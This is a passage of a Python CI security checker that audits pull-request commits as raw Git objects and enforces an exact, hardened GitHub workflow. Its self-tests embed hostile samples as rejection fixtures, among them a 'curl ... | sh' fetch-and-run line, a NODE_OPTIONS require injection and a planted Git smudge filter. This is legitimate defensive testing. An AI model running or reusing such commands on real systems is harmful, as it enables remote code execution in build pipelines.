    for path in expected.keys() - admitted.keys():
        findings.append(f"workflow tree: required Git entry {path!r} is missing")
    return admitted


def audit_git_commit(
    git_dir_argument: Path,
    commit: str,
    trusted_checker: Path,
    *,
    require_fetch_ref: bool = True,
) -> list[str]:
    findings: list[str] = []
    if not HEX_OBJECT_ID.fullmatch(commit):
        return ["commit: expected lowercase 40-hex object id"]
    git_dir = validate_git_dir(git_dir_argument, findings)
    if git_dir is None:
        return sorted(set(findings))
    try:
        if require_fetch_ref:
            refs = parse_refs(git_dir, findings)
            fetched = refs.get(EXPECTED_FETCH_REF)
            if fetched is None:
                findings.append(
                    f"fetch: required ref {EXPECTED_FETCH_REF!r} is missing"
                )
            elif fetched != commit:
                findings.append(
                    "fetch: fetched PR ref does not match the exact expected commit"
                )
            if set(refs) - {EXPECTED_FETCH_REF}:
                findings.append("fetch: unexpected refs exist in candidate git-dir")
            if findings:
                return sorted(set(findings))

        root_tree = parse_commit(git_dir, commit, findings)
        if root_tree is None:
            return sorted(set(findings))
        listing = run_git(
            [
                "ls-tree",
                "-r",
                "-t",
                "-z",
                "--full-tree",
                "--long",
                root_tree,
                "--",
            ],
            git_dir=git_dir,
            max_stdout=MAX_TREE_LISTING_BYTES,
        ).stdout
        entries = parse_tree_listing(listing, findings)
        information = validate_tree_objects(
            git_dir, root_tree, entries, findings
        )
        admitted = validate_workflow_namespace(entries, findings)

        by_path = {entry.path: entry for entry in entries}
        checker_entry = by_path.get(EXPECTED_CHECKER_PATH)
        if checker_entry is None:
            findings.append(
                f"self-protection: required Git entry "
                f"{EXPECTED_CHECKER_PATH!r} is missing"
            )
        elif (checker_entry.mode, checker_entry.kind) != ("100644", "blob"):
            findings.append(
                f"self-protection: {EXPECTED_CHECKER_PATH!r} must be "
                "100644 blob"
            )

        protected_entries = {
            EXPECTED_WORKFLOW_PATH: admitted.get(EXPECTED_WORKFLOW_PATH),
            EXPECTED_CHECKER_PATH: checker_entry,
        }
        protected_content: dict[str, bytes] = {}
        for path, entry in protected_entries.items():
            if entry is None or entry.kind != "blob" or entry.mode != "100644":
                continue
            info = information.get(entry.oid)
            if info is None or info.kind != "blob":
                continue
            if info.size > MAX_PROTECTED_BLOB_BYTES:
                findings.append(
                    f"self-protection: {path!r} exceeds the "
                    f"{MAX_PROTECTED_BLOB_BYTES}-byte limit"
                )
                continue
            protected_content[path] = read_object(
                git_dir, "blob", entry.oid, MAX_PROTECTED_BLOB_BYTES
            )

        workflow_content = protected_content.get(EXPECTED_WORKFLOW_PATH)
        if workflow_content is not None:
            if workflow_content != expected_workflow_bytes():
                findings.append(
                    "self-protection: workflow bytes must exactly match "
                    "the protected-base admission document"
                )
            document = parse_workflow_bytes(
                workflow_content, EXPECTED_WORKFLOW_PATH, findings
            )
            if document is not None:
                findings.extend(
                    f"{EXPECTED_WORKFLOW_PATH}: {finding}"
                    for finding in semantic_differences(
                        document, admitted_workflow()
                    )
                )

        checker_content = protected_content.get(EXPECTED_CHECKER_PATH)
        if checker_content is not None:
            try:
                trusted_bytes = trusted_checker.read_bytes()
            except OSError as error:
                findings.append(
                    f"self-protection: cannot read trusted checker: {error}"
                )
            else:
                if checker_content != trusted_bytes:
                    findings.append(
                        "self-protection: candidate checker must byte-match "
                        "the protected-base checker"
                    )
    except (GitAuditError, OSError) as error:
        findings.append(f"git object audit: {error}")

    unique = sorted(set(findings))
    if len(unique) > 100:
        return unique[:100] + [
            f"audit: {len(unique) - 100} additional finding(s) suppressed"
        ]
    return unique


def read_diagnostic_file(
    root: Path, relative: str, findings: list[str]
) -> bytes | None:
    path = root.joinpath(*PurePosixPath(relative).parts)
    try:
        if path.is_symlink() or not path.is_file():
            findings.append(f"{relative}: required regular file is missing")
            return None
        resolved = path.resolve(strict=True)
        if not resolved.is_relative_to(root):
            findings.append(f"{relative}: path escapes the repository")
            return None
        if resolved.stat().st_size > MAX_PROTECTED_BLOB_BYTES:
            findings.append(
                f"{relative}: source exceeds the protected-file limit"
            )
            return None
        return resolved.read_bytes()
    except OSError as error:
        findings.append(f"{relative}: cannot read diagnostic file: {error}")
        return None


def audit_worktree_diagnostic(
    root: Path, trusted_checker: Path
) -> list[str]:
    findings: list[str] = []
    root = root.resolve(strict=True)
    workflow_dir = root / ".github" / "workflows"
    discovered: list[str] = []
    try:
        if workflow_dir.is_symlink() or not workflow_dir.is_dir():
            findings.append(
                ".github/workflows: required non-symlink directory is missing"
            )
        else:
            for current, directories, files in os.walk(
                workflow_dir, topdown=True, followlinks=False
            ):
                current_path = Path(current)
                for name in directories + files:
                    candidate = current_path / name
                    relative = candidate.relative_to(root).as_posix()
                    discovered.append(relative)
                    if candidate.is_symlink():
                        findings.append(
                            f".github/workflows: symlink entry {relative!r} "
                            "is not admitted"
                        )
    except OSError as error:
        findings.append(f".github/workflows: cannot enumerate: {error}")
    if discovered != [EXPECTED_WORKFLOW_PATH]:
        findings.append(
            ".github/workflows: diagnostic expects exactly "
            f"{EXPECTED_WORKFLOW_PATH!r}; found {sorted(discovered)!r}"
        )

    workflow_content = read_diagnostic_file(
        root, EXPECTED_WORKFLOW_PATH, findings
    )
    checker_content = read_diagnostic_file(
        root, EXPECTED_CHECKER_PATH, findings
    )
    if workflow_content is not None:
        if (
            diagnostic_worktree_bytes(workflow_content)
            != expected_workflow_bytes()
        ):
            findings.append(
                "self-protection: workflow bytes do not match the "
                "admission document"
            )
        document = parse_workflow_bytes(
            workflow_content, EXPECTED_WORKFLOW_PATH, findings
        )
        if document is not None:
            findings.extend(
                f"{EXPECTED_WORKFLOW_PATH}: {finding}"
                for finding in semantic_differences(
                    document, admitted_workflow()
                )
            )
    if checker_content is not None:
        try:
            trusted_bytes = trusted_checker.read_bytes()
        except OSError as error:
            findings.append(
                f"self-protection: cannot read trusted checker: {error}"
            )
        else:
            if checker_content != trusted_bytes:
                findings.append(
                    "self-protection: candidate checker does not byte-match "
                    "the invoked checker"
                )
    return sorted(set(findings))


def clone(document: dict[str, Any]) -> dict[str, Any]:
    return json.loads(json.dumps(document))


def semantic_fixture_findings(
    *, document: dict[str, Any] | None = None, source: str | None = None
) -> list[str]:
    findings: list[str] = []
    content = (
        source.encode("utf-8")
        if source is not None
        else (
            json.dumps(
                document if document is not None else admitted_workflow(),
                indent=2,
            )
            + "\n"
        ).encode("utf-8")
    )
    parsed = parse_workflow_bytes(content, "fixture", findings)
    if parsed is not None:
        findings.extend(semantic_differences(parsed, admitted_workflow()))
    return findings


def expect_semantic_rejected(
    label: str,
    expected: str,
    *,
    document: dict[str, Any] | None = None,
    source: str | None = None,
) -> None:
    findings = semantic_fixture_findings(document=document, source=source)
    if not any(expected in finding for finding in findings):
        raise AssertionError(
            f"{label} did not report {expected!r}: {'; '.join(findings)}"
        )


def fixture_hash_blob(git_dir: Path, content: bytes) -> str:
    result = run_git(
        ["hash-object", "-w", "--stdin"],
        git_dir=git_dir,
        input_data=content,
        max_stdout=128,
    )
    oid = result.stdout.decode("ascii").strip()
    if not HEX_OBJECT_ID.fullmatch(oid):
        raise AssertionError(f"fixture produced malformed blob id {oid!r}")
    return oid


def fixture_write_tree(
    git_dir: Path, entries: dict[bytes, FixtureLeaf]
) -> str:
    root: dict[bytes, Any] = {}
    for path, leaf in entries.items():
        parts = path.split(b"/")
        if not path or any(not part or part in (b".", b"..") for part in parts):
            raise AssertionError(f"invalid fixture path {path!r}")
        current = root
        for part in parts[:-1]:
            child = current.setdefault(part, {})
            if not isinstance(child, dict):
                raise AssertionError(f"fixture path conflict at {path!r}")
            current = child
        if parts[-1] in current:
            raise AssertionError(f"duplicate fixture path {path!r}")
        current[parts[-1]] = leaf

    def write_node(node: dict[bytes, Any]) -> str:
        records: list[bytes] = []
        for name, value in node.items():
            if isinstance(value, dict):
                mode = "040000"
                kind = "tree"
                oid = write_node(value)
            else:
                mode = value.mode
                kind = value.kind
                if value.oid is not None:
                    oid = value.oid
                elif value.kind == "blob" and value.content is not None:
                    oid = fixture_hash_blob(git_dir, value.content)
                else:
                    raise AssertionError(
                        f"fixture entry {name!r} lacks an object"
                    )
            records.append(
                mode.encode("ascii")
                + b" "
                + kind.encode("ascii")
                + b" "
                + oid.encode("ascii")
                + b"\t"
                + name
                + b"\0"
            )
        result = run_git(
            ["mktree", "-z", "--missing"],
            git_dir=git_dir,
            input_data=b"".join(records),
            max_stdout=128,
        )
        tree = result.stdout.decode("ascii").strip()
        if not HEX_OBJECT_ID.fullmatch(tree):
            raise AssertionError(f"fixture produced malformed tree id {tree!r}")
        return tree

    return write_node(root)


def fixture_commit(
    git_dir: Path,
    entries: dict[bytes, FixtureLeaf],
    *,
    parents: tuple[str, ...] = (),
    message: str = "fixture",
) -> str:
    tree = fixture_write_tree(git_dir, entries)
    parent_headers = "".join(f"parent {parent}\n" for parent in parents)
    raw = (
        f"tree {tree}\n"
        f"{parent_headers}"
        "author Fixture <fixture@example.invalid> 0 +0000\n"
        "committer Fixture <fixture@example.invalid> 0 +0000\n"
        f"\n{message}\n"
    ).encode("utf-8")
    result = run_git(
        ["hash-object", "-t", "commit", "-w", "--stdin"],
        git_dir=git_dir,
        input_data=raw,
        max_stdout=128,
    )
    commit = result.stdout.decode("ascii").strip()
    if not HEX_OBJECT_ID.fullmatch(commit):
        raise AssertionError(f"fixture produced malformed commit id {commit!r}")
    return commit


def fixture_update_ref(git_dir: Path, commit: str | None) -> None:
    arguments = ["update-ref"]
    if commit is None:
        arguments.extend(["-d", EXPECTED_FETCH_REF])
    else:
        arguments.extend([EXPECTED_FETCH_REF, commit])
    run_git(arguments, git_dir=git_dir)


def expected_fixture_entries() -> dict[bytes, FixtureLeaf]:
    return {
        EXPECTED_WORKFLOW_PATH.encode("utf-8"): FixtureLeaf(
            content=expected_workflow_bytes()
        ),
        EXPECTED_CHECKER_PATH.encode("utf-8"): FixtureLeaf(
            content=Path(__file__).read_bytes()
        ),
    }


def expect_bare_clean(
    label: str, git_dir: Path, commit: str
) -> None:
    fixture_update_ref(git_dir, commit)
    findings = audit_git_commit(git_dir, commit, Path(__file__))
    if findings:
        raise AssertionError(f"{label} unexpectedly failed: {'; '.join(findings)}")


def expect_bare_rejected(
    label: str,
    expected: str,
    git_dir: Path,
    commit: str,
    *,
    ref_commit: str | None | object = ...,
) -> list[str]:
    if ref_commit is ...:
        fixture_update_ref(git_dir, commit)
    else:
        fixture_update_ref(
            git_dir, ref_commit if isinstance(ref_commit, str) else None
        )
    findings = audit_git_commit(git_dir, commit, Path(__file__))
    if not any(expected in finding for finding in findings):
        raise AssertionError(
            f"{label} did not report {expected!r}: {'; '.join(findings)}"
        )
    return findings


def expect_workflow_policy_rejected(
    label: str,
    git_dir: Path,
    entries: dict[bytes, FixtureLeaf],
    parent: str,
) -> None:
    commit = fixture_commit(git_dir, entries, parents=(parent,), message=label)
    findings = expect_bare_rejected(
        label, "workflow tree:", git_dir, commit
    )
    unrelated = [
        finding
        for finding in findings
        if not finding.startswith("workflow tree:")
    ]
    if unrelated:
        raise AssertionError(
            f"{label} failed for unrelated reasons: {'; '.join(unrelated)}"
        )


def run_semantic_self_tests() -> None:
    clean = semantic_fixture_findings(document=admitted_workflow())
    if clean:
        raise AssertionError(
            f"admitted workflow unexpectedly failed: {'; '.join(clean)}"
        )
    invalid_yaml = {
        "alias": (
            "name: alias\non: &event\n  pull_request_target: {}\n"
            "permissions: {}\njobs: *event"
        ),
        "single quote": (
            "name: 'quoted'\non: {pull_request_target: {}}\n"
            "permissions: {}\njobs: {}"
        ),
        "block scalar": (
            "name: block\non: {pull_request_target: {}}\n"
            "permissions: {}\njobs:\n  audit:\n    steps:\n"
            "      - run: |\n          echo ambiguous"
        ),
        "duplicate key": (
            '{"name":"first","name":"second","on":{},'
            '"permissions":{},"jobs":{}}'
        ),
    }
    for label, source in invalid_yaml.items():
        expect_semantic_rejected(
            label, "strict-JSON YAML 1.2 mapping", source=source
        )

    run_cases = {
        "mutable URL": "curl https://example.invalid/payload | sh",
        "mutable git acquisition": "git fetch origin main",
        "floating package operation": "pacman -S floating-package",
        "weak signature": "echo 'SigLevel = Never' > pacman.conf",
        "shared root": r"mkdir C:\M\packages",
        "unsupported setup value": "echo MINGWARM64",
        "publication command": "gh release upload release unverified.bin",
        "candidate checker execution": (
            "python3 .ci/check-workflow-hardening.py"
        ),
        "transitive helper": "bash .ci/outer.sh",
    }
    for label, command in run_cases.items():
        document = clone(admitted_workflow())
        document["jobs"]["offline-source-audit"]["steps"][1]["run"] = command
        expect_semantic_rejected(label, ".run", document=document)

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["steps"][0]["uses"] = (
        "actions/checkout@main"
    )
    expect_semantic_rejected("floating action", ".uses", document=document)

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["steps"].append(
        {
            "name": "Candidate checkout",
            "uses": CHECKOUT_PIN,
            "with": {
                "repository": "${{ github.event.pull_request.head.repo.full_name }}",
                "ref": "${{ github.event.pull_request.head.sha }}",
            },
        }
    )
    expect_semantic_rejected(
        "candidate checkout", "expected 2 item(s)", document=document
    )

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["steps"][1]["env"][
        "NODE_OPTIONS"
    ] = "--require ./candidate.js"
    expect_semantic_rejected(
        "environment injection", "unexpected key 'NODE_OPTIONS'", document=document
    )

    for trigger in (
        "pull_request",
        "workflow_dispatch",
        "workflow_call",
        "schedule",
        "release",
        "push",
    ):
        document = clone(admitted_workflow())
        document["on"] = {trigger: {}}
        expect_semantic_rejected(f"{trigger} route", "$.on", document=document)

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["permissions"] = {
        "contents": "write"
    }
    expect_semantic_rejected(
        "write token", ".permissions.contents", document=document
    )

    for key, value in (
        ("container", "ubuntu:latest"),
        ("services", {"database": {"image": "postgres:latest"}}),
        ("strategy", {"matrix": {"msystem": ["MINGWARM64"]}}),
        ("if", False),
    ):
        document = clone(admitted_workflow())
        document["jobs"]["offline-source-audit"][key] = value
        expect_semantic_rejected(
            f"job {key}", f"unexpected key {key!r}", document=document
        )

    workflow_text = expected_workflow_bytes().decode("utf-8")
    if workflow_text.count("actions/checkout@") != 1:
        raise AssertionError("admitted workflow must contain one checkout action")
    for forbidden in (
        "actions/download-artifact@",
        "actions/upload-artifact@",
        "actions/setup-python@",
        "msys2/setup-msys2@",
        "MINGWARM64",
        "workflow_dispatch",
        "workflow_call",
        '"push"',
        '"release"',
    ):
        if forbidden in workflow_text:
            raise AssertionError(
                f"admitted workflow contains forbidden route {forbidden!r}"
            )
    expected_pins = {
        "actions/checkout": "11d5960a326750d5838078e36cf38b85af677262",
        "actions/download-artifact": "d3f86a106a0bac45b974a628896c90dbdf5c8093",
        "actions/setup-python": "a26af69be951a213d495a4c3e4e4022e16d87065",
        "actions/upload-artifact": "ea165f8d65b6e75b540449e92b4886f43607fa02",
        "al-cheb/configure-pagefile-action": (
            "a3b6ebd6b634da88790d9c58d4b37a7f4a7b8708"
        ),
        "msys2/setup-msys2": (
            "66cd2cce69caa17b53920067426061ca1de3a884"
        ),
    }
    if AUDITED_ACTION_PINS != expected_pins:
        raise AssertionError("the six audited lower-layer action pins changed")


def run_bare_self_tests() -> None:
    with tempfile.TemporaryDirectory() as temporary:
        root = Path(temporary).resolve(strict=True)
        git_dir = root / "candidate.git"
        git_dir.mkdir(mode=0o700)
        run_git(
            [
                "init",
                "--quiet",
                "--bare",
                "--object-format=sha1",
                f"--template={os.devnull}",
                "--",
                str(git_dir),
            ]
        )

        base_entries = expected_fixture_entries()
        parent = fixture_commit(git_dir, base_entries, message="parent")
        clean_commit = fixture_commit(
            git_dir, base_entries, parents=(parent,), message="clean"
        )
        expect_bare_clean("exact bare commit", git_dir, clean_commit)

        workflow_cases = {
            "dot yml": b".github/workflows/.yml",
            "dot yaml": b".github/workflows/.yaml",
            "extensionless hidden": b".github/workflows/.hidden",
            "nested workflow": b".github/workflows/nested/extra",
            "mixed-case workflow": b".github/workflows/Main.yml",
            "alternate namespace case": b".github/WORKFLOWS/main.yml",
        }
        for label, path in workflow_cases.items():
            entries = dict(base_entries)
            entries[path] = FixtureLeaf()
            expect_workflow_policy_rejected(label, git_dir, entries, parent)

        entries = dict(base_entries)
        entries[b".github/workflows/caf\xc3\xa9.yml"] = FixtureLeaf()
        entries[b".github/workflows/cafe\xcc\x81.yml"] = FixtureLeaf()
        expect_workflow_policy_rejected(
            "NFC workflow aliases", git_dir, entries, parent
        )

        entries = dict(base_entries)
        entries[b".github/workflows/link"] = FixtureLeaf(
            mode="120000", content=b"../../payload"
        )
        expect_workflow_policy_rejected(
            "workflow symlink", git_dir, entries, parent
        )

        dummy_commit = fixture_commit(git_dir, base_entries, message="gitlink")
        entries = dict(base_entries)
        entries[b".github/workflows/module"] = FixtureLeaf(
            mode="160000", kind="commit", content=None, oid=dummy_commit
        )
        expect_workflow_policy_rejected(
            "workflow non-blob", git_dir, entries, parent
        )

        entries = dict(base_entries)
        entries[EXPECTED_WORKFLOW_PATH.encode("utf-8")] = FixtureLeaf(
            mode="120000", content=b"../../payload"
        )
        expect_workflow_policy_rejected(
            "authoritative workflow symlink", git_dir, entries, parent
        )

        missing_ref_findings = expect_bare_rejected(
            "missing pull ref",
            "required ref",
            git_dir,
            clean_commit,
            ref_commit=None,
        )
        if any(not finding.startswith("fetch:") for finding in missing_ref_findings):
            raise AssertionError("missing ref did not fail in fetch validation")

        moved_commit = fixture_commit(
            git_dir, base_entries, parents=(parent,), message="moved"
        )
        moved_ref_findings = expect_bare_rejected(
            "moved pull ref",
            "does not match",
            git_dir,
            clean_commit,
            ref_commit=moved_commit,
        )
        if any(not finding.startswith("fetch:") for finding in moved_ref_findings):
            raise AssertionError("moved ref did not fail in fetch validation")

        entries = dict(base_entries)
        entries[b"missing-object.bin"] = FixtureLeaf(
            content=None, oid="1" * 40
        )
        missing_object_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="missing object"
        )
        expect_bare_rejected(
            "missing object",
            "required object",
            git_dir,
            missing_object_commit,
        )

        entries = dict(base_entries)
        entries[b"README"] = FixtureLeaf(content=b"upper\n")
        entries[b"readme"] = FixtureLeaf(content=b"lower\n")
        alias_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="case alias"
        )
        expect_bare_rejected(
            "global case alias", "canonical path alias", git_dir, alias_commit
        )

        entries = dict(base_entries)
        entries[b"non-utf8-\xff"] = FixtureLeaf()
        non_utf8_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="non utf8"
        )
        expect_bare_rejected(
            "non-UTF-8 path", "non-UTF-8 path", git_dir, non_utf8_commit
        )

        entries = dict(base_entries)
        entries[b"ambiguous\\path"] = FixtureLeaf()
        ambiguous_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="ambiguous path"
        )
        expect_bare_rejected(
            "ambiguous path", "ambiguous path", git_dir, ambiguous_commit
        )

        parents = tuple(
            fixture_commit(git_dir, base_entries, message=f"parent {index}")
            for index in range(3)
        )
        multi_parent_commit = fixture_commit(
            git_dir, base_entries, parents=parents, message="extra parents"
        )
        expect_bare_rejected(
            "extra parents",
            "more than two parents",
            git_dir,
            multi_parent_commit,
        )

        entries = dict(base_entries)
        entries[EXPECTED_CHECKER_PATH.encode("utf-8")] = FixtureLeaf(
            content=b"#!/usr/bin/env python3\nprint('candidate')\n"
        )
        checker_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="checker mutation"
        )
        expect_bare_rejected(
            "checker mutation",
            "candidate checker must byte-match",
            git_dir,
            checker_commit,
        )

        entries = dict(base_entries)
        entries[EXPECTED_WORKFLOW_PATH.encode("utf-8")] = FixtureLeaf(
            content=b"{}\n"
        )
        workflow_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="workflow mutation"
        )
        expect_bare_rejected(
            "workflow mutation",
            "workflow bytes must exactly match",
            git_dir,
            workflow_commit,
        )

        marker = root / "candidate-filter-executed"
        config = git_dir / "config"
        with config.open("a", encoding="utf-8") as stream:
            stream.write(
                '\n[filter "candidate-audit"]\n'
                f"\tsmudge = echo executed > {marker.as_posix()}\n"
                "\trequired = true\n"
            )
        entries = dict(base_entries)
        entries[b".gitattributes"] = FixtureLeaf(
            content=b"* filter=candidate-audit\n"
        )
        entries[b"candidate.txt"] = FixtureLeaf(content=b"raw candidate bytes\n")
        attributes_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="attributes"
        )
        expect_bare_clean(
            "malicious attributes remain raw", git_dir, attributes_commit
        )
        if marker.exists():
            raise AssertionError("candidate Git filter command was executed")

        entries[b"candidate-link"] = FixtureLeaf(
            mode="120000", content=b"candidate.txt"
        )
        symlink_commit = fixture_commit(
            git_dir, entries, parents=(parent,), message="symlink"
        )
        expect_bare_rejected(
            "candidate symlink", "unexpected mode/type", git_dir, symlink_commit
        )
        if marker.exists():
            raise AssertionError("candidate filter ran while rejecting symlink")
        if (root / "candidate.txt").exists() or (root / "candidate-link").exists():
            raise AssertionError("candidate tree content was materialized")


def run_self_tests() -> None:
    run_semantic_self_tests()
    local_workflow = (
        Path(__file__).resolve().parent.parent
        / ".github"
        / "workflows"
        / "main.yml"
    )
    try:
        local_bytes = local_workflow.read_bytes()
    except OSError as error:
        raise AssertionError(f"cannot read coordinated workflow: {error}") from error
    if diagnostic_worktree_bytes(local_bytes) != expected_workflow_bytes():
        raise AssertionError(
            "protected main workflow and checker admission document differ"
        )
    run_bare_self_tests()
    print("Workflow hardening raw-object adversarial self-tests passed.")


def report_findings(findings: list[str]) -> int:
    if not findings:
        return 0
    for finding in findings:
        print(f"ERROR: {finding}")
    print(
        f"Workflow hardening audit failed with {len(findings)} finding(s).",
        file=sys.stderr,
    )
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Audit the exact workflow admission document without materializing "
            "candidate Git objects"
        )
    )
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument(
        "--self-test",
        action="store_true",
        help="run isolated semantic and synthetic bare-object regressions",
    )
    mode.add_argument(
        "--repo",
        type=Path,
        help="non-authoritative worktree diagnostic",
    )
    mode.add_argument(
        "--git-dir",
        type=Path,
        help="authoritative isolated bare Git object database",
    )
    parser.add_argument(
        "--commit",
        help="exact lowercase 40-hex candidate commit for --git-dir",
    )
    args = parser.parse_args()
    if args.self_test:
        if args.commit is not None:
            parser.error("--commit is only valid with --git-dir")
        run_self_tests()
        return 0
    if args.git_dir is not None:
        if args.commit is None:
            parser.error("--git-dir requires --commit")
        findings = audit_git_commit(
            args.git_dir, args.commit, Path(__file__)
        )
        if report_findings(findings):
            return 1
        print(
            "Validated the exact fetched PR commit as bounded raw Git objects; "
            "candidate files, filters, hooks, links, and helpers were not executed."
        )
    else:
        if args.commit is not None:
            parser.error("--commit is only valid with --git-dir")
        repo_root = (
            args.repo.resolve(strict=True)
            if args.repo is not None
            else Path(__file__).resolve().parent.parent
        )
        if not repo_root.is_dir():
            parser.error(f"repository root is not a directory: {repo_root}")
        findings = audit_worktree_diagnostic(repo_root, Path(__file__))
        if report_findings(findings):
            return 1
        print(
            "Non-authoritative worktree diagnostic matched the exact workflow "
            "and checker bytes."
        )
    print(
        "Package, artifact, publication, container, service, cache, mutable "
        "acquisition, candidate checkout, and MINGWARM64 routes remain unreachable."
    )
    print(
        "System Git and Python come from the mutable runner image and are not a "
        "reproducibly pinned native toolchain."
    )
    print(
        "This source gate becomes authoritative only from a protected base where "
        "its exact trusted checker is required by repository policy."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
